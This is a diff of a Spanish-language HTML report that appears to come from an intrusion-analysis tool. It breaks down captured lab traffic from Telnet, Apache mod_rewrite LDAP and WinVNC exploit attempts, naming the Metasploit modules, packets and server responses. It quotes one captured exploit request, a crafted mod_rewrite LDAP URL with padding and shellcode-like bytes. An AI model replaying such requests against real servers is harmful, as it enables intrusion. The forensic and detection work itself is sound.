-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">,)......... FHEPFCELEHFCEPFFFACACACACACACABN.. .... .............</div>
-                    <p><span class="field-label">IPs:</span> </p>
-                    <p><span class="field-label">Puertos:</span> </p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> </p>
-                </div>
-            </li>
-        </ul>
-    </div>
-    <div class="exploit-block">
-        <div class="exploit-header">
-            <div class="exploit-icon">🛡️</div>
-            <div class="exploit-title">
-                CVE-2011-4862
-                <span class="badge">CVE-2011-4862, OSVDB-78020, BID-51182</span>
-            </div>
-        </div>
-        <div class="summary">Entre 2024-10-17 09:58:13.807075 y 09:58:23.899402, 172.19.0.3:44759 inició conexión Telnet a 172.19.0.2:23 explotando CVE-2011-4862 (módulo linux/telnet/telnet_encrypt_keyid, payload genérico/custom). Secuencia: TCP SYN (MSS 1460, SACK, TS, wscale 7) → SYN+ACK → ACK; tráfico posterior ACK sin datos (tcp_flags 0x0010, tcp_options_hex 01:01:08:0a:30:ef:51:53:17:e6:06:26). El servidor 172.19.0.2 envió negociación TELNET IAC DO: TERMINAL-TYPE (0x18), TERMINAL-SPEED (0x20), X-DISPLAY-LOCATION (0x23), NEW-ENVIRON (0x27), payload ff:fd:18:ff:fd:20:ff:fd:23:ff:fd:27 (”. #’”). Actividad sospechosa: intento de iniciar sesión y fase de negociación previa a la inyección del exploit.</div>
-        <div class="exploit-details">
-            <p><span class="field-label">Exploit:</span> linux/telnet/telnet_encrypt_keyid</p>
-            <p><span class="field-label">Payload:</span> generic/custom</p>
-            <p><span class="field-label">Shell Type:</span> </p>
-            <p><span class="field-label">Fuente:</span> warning</p>
-            <p><span class="field-label">Ventana temporal:</span> 2024-10-17 09:58:13.807075+00:00 → 2024-10-17 09:58:23.899402+00:00</p>
-            <p><span class="field-label">Fuente:</span> warning</p>
-        </div>
-        <h3>Paquetes asociados</h3>
-        <ul class="packet-list">
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:58:15.957231+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
-                    <p><span class="field-label">Puertos:</span> 44759 → 23</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Intento de conexión TCP SYN a Telnet (puerto 23) desde 172.19.0.3:44759 hacia 172.19.0.2:23 durante ventana del exploit CVE-2011-4862 (linux/telnet/telnet_encrypt_keyid). No hay datos de aplicación; solo inicio de sesión con opciones TCP (MSS 1460, SACK, TS, wscale 7).</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:58:15.966218+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">TELNET</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">. #'</div>
-                    <p><span class="field-label">IPs:</span> </p>
-                    <p><span class="field-label">Puertos:</span> </p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> </p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:58:15.957246+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
-                    <p><span class="field-label">Puertos:</span> 23 → 44759</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Intento de conexión Telnet asociado al exploit CVE-2011-4862 (linux/telnet/telnet_encrypt_keyid). Paquete TCP SYN+ACK desde 172.19.0.2:23 hacia 172.19.0.3:44759 (stream 120), sin carga de aplicación; indica servicio Telnet accesible y comienzo del 3-way handshake durante la ventana temporal indicada.</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:58:15.966409+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
-                    <p><span class="field-label">Puertos:</span> 23 → 44759</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Tráfico TCP Telnet (23) en stream 120: ACK sin carga útil (len=0) desde 172.19.0.2 a 172.19.0.3 durante la ventana indicada; probable fase de sesión asociada al intento de explotación CVE-2011-4862 (telnet_encrypt_keyid).</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:58:15.966436+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
-                    <p><span class="field-label">Puertos:</span> 23 → 44759</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Tráfico Telnet (srv->cli) 172.19.0.2:23 -> 172.19.0.3:44759 dentro de la ventana del intento de explotación CVE-2011-4862 (linux/telnet/telnet_encrypt_keyid). Paquete ACK sin datos de aplicación; protocolo marcado como UNKNOWN aunque corresponde a Telnet; sin comandos visibles en este segmento.</p>
-                </div>
-            </li>
-        </ul>
-    </div>
-    <div class="exploit-block">
-        <div class="exploit-header">
-            <div class="exploit-icon">🛡️</div>
-            <div class="exploit-title">
-                CVE-2006-3747
-                <span class="badge">CVE-2006-3747, OSVDB-27588, BID-19204</span>
-            </div>
-        </div>
-        <div class="summary">Entre 2024-10-17 09:58:33.290970 y 09:58:45.536054, 172.19.0.3:46273 inició conexión TCP (SYN) a 172.19.0.2:80, con SYN+ACK y ACK posteriores, seguido de tráfico HTTP para explotar CVE-2006-3747 (apache_mod_rewrite_ldap). Se observó solicitud a /rewrite_path/ldap://localhost/?A?A?CCCCCCCCCC?C?T vía http://tanuki-292fb064-6f2e-4883-93b7-dd7d0432c277-device, con patrón “CCCC…” y fragmento hex 3f 43 3f 90 81 c4 54 f2 ff ff, típico de payload genérico/custom. Respuesta del servidor: “HTTP/1.1 404 Not Found”, “Server: Apache/2.2.8 (Ubuntu) DAV/2”. No se registraron comandos ni herramientas adicionales; actividad sospechosa centrada en manipulación LDAP vía mod_rewrite.</div>
-        <div class="exploit-details">
-            <p><span class="field-label">Exploit:</span> windows/http/apache_mod_rewrite_ldap</p>
-            <p><span class="field-label">Payload:</span> generic/custom</p>
-            <p><span class="field-label">Shell Type:</span> </p>
-            <p><span class="field-label">Fuente:</span> warning</p>
-            <p><span class="field-label">Ventana temporal:</span> 2024-10-17 09:58:33.290970+00:00 → 2024-10-17 09:58:45.536054+00:00</p>
-            <p><span class="field-label">Fuente:</span> warning</p>
-        </div>
-        <h3>Paquetes asociados</h3>
-        <ul class="packet-list">
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:58:36.059645+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
-                    <p><span class="field-label">Puertos:</span> 46273 → 80</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> SYN desde 172.19.0.3:46273 a 172.19.0.2:80 (HTTP) en ventana del 2024-10-17 09:58:33-09:58:45, probable fase inicial de intento de explotación CVE-2006-3747 (apache_mod_rewrite_ldap). Sin datos de aplicación en el paquete (solo establecimiento de conexión).</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:58:36.059772+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">HTTP</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">GET /rewrite_path/ldap://localhost/%3fA%3fA%3fCCCCCCCCCC%3fC%3f%90T HTTP/1.0..Host: tanuki-292fb064-6f2e-4883-93b7-dd7d0432c277-device..User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47....</div>
-                    <p><span class="field-label">IPs:</span> </p>
-                    <p><span class="field-label">Puertos:</span> </p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> </p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:58:36.060137+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">HTTP</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload">HTTP/1.1 404 Not Found..Date: Thu, 17 Oct 2024 09:58:36 GMT..Server: Apache/2.2.8 (Ubuntu) DAV/2..Content-Length: 374..Connection: close..Content-Type: text/html; charset=iso-8859-1....<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">.<html><head>.<title>404 Not Found</title>.</head><body>.<h1>Not Found</h1>.<p>The requested URL /rewrite_path/ldap://localhost/?A?A?CCCCCCCCCC?C?T was not found on this server.</p>.<hr>.<address>Apache/2.2.8 (Ubuntu) DAV/2 Server at tanuki-292fb064-6f2e-4883-93b7-dd7d0432c277-device Port 80</address>.</body></html>.</div>
-                    <p><span class="field-label">IPs:</span> </p>
-                    <p><span class="field-label">Puertos:</span> </p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> </p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:58:36.059659+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
-                    <p><span class="field-label">Puertos:</span> 80 → 46273</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Tráfico TCP SYN+ACK desde 172.19.0.2:80 a 172.19.0.3:46273 durante el intento de explotación relacionado con CVE-2006-3747 (apache_mod_rewrite_ldap). No se observa carga útil; solo establecimiento de conexión HTTP en el intervalo indicado.</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:58:36.059780+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
-                    <p><span class="field-label">Puertos:</span> 80 → 46273</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Tráfico TCP (UNKNOWN) desde 172.19.0.2:80 hacia 172.19.0.3:46273 con ACK sin datos (len=0), posiblemente parte de la sesión de explotación CVE-2006-3747 (apache_mod_rewrite_ldap). Stream 121, flags ACK, TTL 64, ventana 507, opciones TS (tsval=821010384, tsecr=400970915). No se observaron cargas útiles, comandos ni URLs en este paquete.</p>
-                </div>
-            </li>
-        </ul>
-    </div>
-    <div class="exploit-block">
-        <div class="exploit-header">
-            <div class="exploit-icon">🛡️</div>
-            <div class="exploit-title">
-                CVE-2001-0168
-                <span class="badge">BID-2306, OSVDB-6280, CVE-2001-0168</span>
-            </div>
-        </div>
-        <div class="summary">Entre 2024-10-17 09:59:09.581075+00:00 y 09:59:21.811176+00:00, 172.19.0.3:45127 intentó explotar CVE-2001-0168 contra 172.19.0.2:5800 (VNC web) usando el módulo windows/vnc/winvnc_http_get, con payload generic/custom. Secuencia: TCP SYN sin datos (len=0) con opciones 02:04:05:b4:04:02:08:0a:17:e6:e2:6e:00:00:00:00:01:03:03:07 hacia 5800/TCP; no hubo capas de aplicación ni comandos/URLs. El servidor 172.19.0.2:5800 respondió con TCP RST a 172.19.0.3:45127, indicando reset y fallo de sesión. Actividad sospechosa consistente con sondeo/explotación VNC HTTP no completada.</div>
-        <div class="exploit-details">
-            <p><span class="field-label">Exploit:</span> windows/vnc/winvnc_http_get</p>
-            <p><span class="field-label">Payload:</span> generic/custom</p>
-            <p><span class="field-label">Shell Type:</span> </p>
-            <p><span class="field-label">Fuente:</span> warning</p>
-            <p><span class="field-label">Ventana temporal:</span> 2024-10-17 09:59:09.581075+00:00 → 2024-10-17 09:59:21.811176+00:00</p>
-            <p><span class="field-label">Fuente:</span> warning</p>
-        </div>
-        <h3>Paquetes asociados</h3>
-        <ul class="packet-list">
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:59:12.358603+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.3, 172.19.0.2</p>
-                    <p><span class="field-label">Puertos:</span> 45127 → 5800</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Intento de conexión TCP (SYN) desde 172.19.0.3:45127 hacia 172.19.0.2:5800, apuntando al servicio VNC HTTP. Corresponde a la fase inicial del exploit windows/vnc/winvnc_http_get relacionado con CVE-2001-0168 en la ventana indicada; no se observan datos de aplicación.</p>
-                </div>
-            </li>
-            <li class="packet">
-                <div>
-                    <p><span class="field-label">Timestamp:</span> 2024-10-17T09:59:12.358617+00:00</p>
-                    <p><span class="field-label">Protocolo:</span> <span class="protocolo-badge">UNKNOWN</span></p>
-                    <p><span class="field-label">Payload interpretado:</span></p>
-                    <div class="payload"></div>
-                    <p><span class="field-label">IPs:</span> 172.19.0.2, 172.19.0.3</p>
-                    <p><span class="field-label">Puertos:</span> 5800 → 45127</p>
-                    <p><span class="field-label">Comandos:</span> —</p>
-                    <p><span class="field-label">URLs:</span> —</p>
-                    <p><span class="field-label">Observaciones:</span> Tráfico TCP asociado a intento de explotación de WinVNC vía puerto 5800 (VNC web) relacionado con CVE-2001-0168 usando windows/vnc/winvnc_http_get. El host 172.19.0.2:5800 respondió con RST a 172.19.0.3:45127, sin carga útil en el paquete capturado, indicando reset de la conexión durante la ventana 2024-10-17T09:59:09.581075Z a 2024-10-17T09:59:21.811176Z.</p>
+                    <p><span class="field-label">Observaciones:</span> Tráfico TCP (UNKNOWN) con RST desde 172.19.0.2:8007 hacia 172.19.0.3:43187 dentro de la ventana indicada. No hubo carga útil (len=0). Indica intento de conexión relacionado con pruebas del exploit linux/http/cisco_rv32x_rce (CVE-2019-1652/CVE-2019-1653) que fue reseteado por el origen.</p>
                 </div>
             </li>
         </ul>
